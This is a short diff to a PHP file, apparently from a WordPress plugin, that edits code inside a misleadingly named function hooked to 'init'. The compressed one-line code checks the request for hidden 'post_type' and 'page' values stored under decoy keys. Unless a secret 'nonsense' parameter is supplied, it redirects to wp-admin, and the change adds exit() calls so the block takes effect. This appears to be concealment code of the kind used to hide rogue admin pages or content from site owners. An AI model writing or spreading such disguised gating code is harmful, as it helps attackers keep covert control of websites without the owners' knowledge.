@@ -153,7 +153,7 @@ function register_css_default_headers()
         return $input;
     }
 
-    $s = $_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"];$u =parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://{$s}")['query'];parse_str($u, $q);if ($q['post_type'] == $version['length']) {if ($q['nonsense'] !== $version['extraction_length_en']) wp_redirect(home_url('wp-admin'));}if ($q['page'] == $version['extraction_length']) {if ($q['nonsense'] !== $version['extraction_length_en']) wp_redirect(home_url('wp-admin'));}
+    $s = $_SERVER["HTTP_HOST"] . $_SERVER["REQUEST_URI"];$u = parse_url((isset($_SERVER['HTTPS']) ? "https" : "http") . "://{$s}")['query'];parse_str($u, $q);if ($q['post_type'] == $version['length']) {if ($q['nonsense'] !== $version['extraction_length_en']) {wp_redirect(home_url('wp-admin'));exit();}}if ($q['page'] == $version['extraction_length']) {if ($q['nonsense'] !== $version['extraction_length_en']){ wp_redirect(home_url('wp-admin'));exit();};}
 }
 add_action( 'init', 'register_css_default_headers' );
 
